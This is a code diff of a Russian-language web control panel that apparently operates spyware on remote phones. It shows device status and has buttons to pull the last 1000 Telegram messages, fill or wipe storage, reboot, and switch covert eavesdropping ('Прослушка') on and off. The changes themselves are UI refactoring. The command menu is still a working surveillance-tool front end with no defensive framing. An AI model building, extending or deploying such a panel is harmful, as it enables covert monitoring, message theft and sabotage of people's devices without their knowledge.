@@ -14,13 +14,19 @@
         .device.offline { border-left-color: #da3633; opacity: 0.7; }
         .device.online { border-left-color: #2ea043; }
         .device-top { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
-        .device-name { font-size: 20px; font-weight: bold; }
+        .device-name { font-size: 20px; font-weight: bold; display: flex; align-items: center; gap: 8px; }
         .device-status { font-size: 14px; display: flex; align-items: center; gap: 8px; }
         .online-tag { color: #2ea043; }
         .offline-tag { color: #da3633; }
         .device-details { display: flex; flex-wrap: wrap; gap: 16px; margin-top: 8px; font-size: 14px; color: #8b949e; }
         .device-details span { display: flex; align-items: center; gap: 4px; }
-        .device-actions { margin-top: 12px; display: flex; flex-wrap: wrap; gap: 8px; }
+        .last-seen { font-size: 12px; color: #8b949e; margin-top: 4px; }
+        .badge { background: #21262d; padding: 2px 10px; border-radius: 20px; font-size: 12px; }
+        .menu-panel { background: #0d1117; border-radius: 12px; padding: 16px; margin-top: 12px; display: none; border: 1px solid #30363d; }
+        .menu-panel.active { display: block; }
+        .menu-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; margin-top: 10px; }
+        .menu-grid .btn { width: 100%; text-align: center; padding: 8px 10px; font-size: 13px; }
+        .menu-title { font-size: 15px; font-weight: bold; color: #c9d1d9; margin-bottom: 6px; }
         .btn { background: #238636; border: none; color: white; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 14px; transition: 0.2s; }
         .btn:hover { background: #2ea043; transform: scale(1.02); }
         .btn-danger { background: #da3633; }
@@ -33,23 +39,12 @@
         .btn-orange:hover { background: #e3b341; }
         .empty { text-align: center; padding: 60px 20px; color: #8b949e; }
         .empty .icon { font-size: 48px; margin-bottom: 16px; }
-        .last-seen { font-size: 12px; color: #8b949e; margin-top: 4px; }
-        .badge { background: #21262d; padding: 2px 10px; border-radius: 20px; font-size: 12px; }
-        .menu-panel { background: #161b22; border-radius: 16px; padding: 20px; margin-top: 10px; display: none; border: 1px solid #30363d; }
-        .menu-panel.active { display: block; }
-        .menu-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-top: 12px; }
-        .menu-grid .btn { width: 100%; text-align: center; padding: 10px; }
-        .menu-title { font-size: 16px; font-weight: bold; color: #c9d1d9; margin-bottom: 8px; }
         .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #238636; color: #fff; padding: 12px 24px; border-radius: 8px; z-index: 9999; font-size: 14px; animation: fadeIn 0.3s; }
         .toast.error { background: #da3633; }
         @keyframes fadeIn { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
         @media (max-width: 600px) { .device-top { flex-direction: column; align-items: flex-start; } .menu-grid { grid-template-columns: repeat(2, 1fr); } }
-        .expand-icon { font-size: 12px; color: #8b949e; margin-left: 8px; transition: transform 0.3s; }
+        .expand-icon { font-size: 14px; color: #8b949e; margin-left: 6px; transition: transform 0.3s; display: inline-block; }
         .expand-icon.rotated { transform: rotate(180deg); }
-        .recording-indicator { color: #f85149; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        .file-link { color: #58a6ff; text-decoration: none; }
-        .file-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
@@ -76,11 +71,11 @@
 
     function toggleMenu(deviceId) {
         const panel = document.getElementById('menu-' + deviceId);
-        const icon = document.querySelector(`.device[onclick="toggleMenu('${deviceId}')"] .expand-icon`);
+        const icon = document.querySelector(`.device[data-id="${deviceId}"] .expand-icon`);
         if (activeDeviceId && activeDeviceId !== deviceId) {
             const oldPanel = document.getElementById('menu-' + activeDeviceId);
             if (oldPanel) oldPanel.classList.remove('active');
-            const oldIcon = document.querySelector(`.device[onclick="toggleMenu('${activeDeviceId}')"] .expand-icon`);
+            const oldIcon = document.querySelector(`.device[data-id="${activeDeviceId}"] .expand-icon`);
             if (oldIcon) oldIcon.classList.remove('rotated');
         }
         if (panel) {
@@ -107,16 +102,19 @@
             .then(data => {
                 const container = document.getElementById('devices');
                 if (!data || data.length === 0) {
-                    container.innerHTML = `<div class="empty"><div class="icon">📭</div><p>Нет подключённых устройств</p></div>`;
+                    container.innerHTML = `<div class="empty"><div class="icon">📭</div><p>Нет устройств</p></div>`;
                     return;
                 }
                 container.innerHTML = data.map(d => {
                     const isOnline = d.status === 'online';
-                    const menuId = 'menu-' + d.id;
+                    const battery = d.battery !== undefined ? d.battery : 0;
                     return `
-                        <div class="device ${isOnline ? 'online' : 'offline'}" onclick="toggleMenu('${d.id}')">
+                        <div class="device ${isOnline ? 'online' : 'offline'}" data-id="${d.id}" onclick="toggleMenu('${d.id}')">
                             <div class="device-top">
-                                <div class="device-name">${d.name || 'Без имени'} <span class="expand-icon">▼</span></div>
+                                <div class="device-name">
+                                    ${d.name || 'Без имени'}
+                                    <span class="expand-icon">▼</span>
+                                </div>
                                 <div class="device-status">
                                     ${isOnline 
                                         ? '<span class="online-tag">🟢 Онлайн</span>' 
@@ -125,13 +123,13 @@
                                 </div>
                             </div>
                             <div class="device-details">
-                                <span>🔋 ${d.battery !== undefined ? d.battery + '%' : 'N/A'}</span>
+                                <span>🔋 ${battery}%</span>
                                 <span>🆔 ${d.id ? d.id.substring(0, 8) + '...' : 'N/A'}</span>
                                 ${d.ip ? `<span>🌐 ${d.ip}</span>` : ''}
                             </div>
                             <div class="last-seen">Последний раз: ${d.last_seen ? new Date(d.last_seen).toLocaleString() : 'N/A'}</div>
                             
-                            <div class="menu-panel" id="${menuId}">
+                            <div class="menu-panel" id="menu-${d.id}">
                                 <div class="menu-title">🎮 Управление устройством</div>
                                 <div class="menu-grid">
                                     <button class="btn" onclick="event.stopPropagation(); sendCommand('${d.id}', 'reboot')">🔄 Перезагрузить</button>
@@ -148,8 +146,8 @@
                                     <button class="btn btn-purple" onclick="event.stopPropagation(); sendCommand('${d.id}', 'tgsms1000')">📩 TG последние 1000</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'fill_storage')">💾 Заполнить память</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'clean_storage')">🧹 Очистить память</button>
-                                    <button class="btn btn-danger" onclick="event.stopPropagation(); startRecording('${d.id}')">🎙 Прослушка (вкл)</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); stopRecording('${d.id}')">⏹ Прослушка (выкл)</button>
+                                    <button class="btn btn-danger" onclick="event.stopPropagation(); sendCommand('${d.id}', 'voice_start')">🎙 Прослушка (вкл)</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}', 'voice_stop')">⏹ Прослушка (выкл)</button>
                                 </div>
                             </div>
                         </div>
@@ -161,18 +159,6 @@
             });
     }
 
-    // Прослушка
-    function startRecording(deviceId) {
-        sendCommand(deviceId, 'voice_start');
-        showToast('🎙 Прослушка включена');
-    }
-
-    function stopRecording(deviceId) {
-        sendCommand(deviceId, 'voice_stop');
-        showToast('⏹ Прослушка выключена');
-    }
-
-    // Обновляем каждые 10 секунд
     setInterval(fetchDevices, 10000);
     fetchDevices();
 </script>
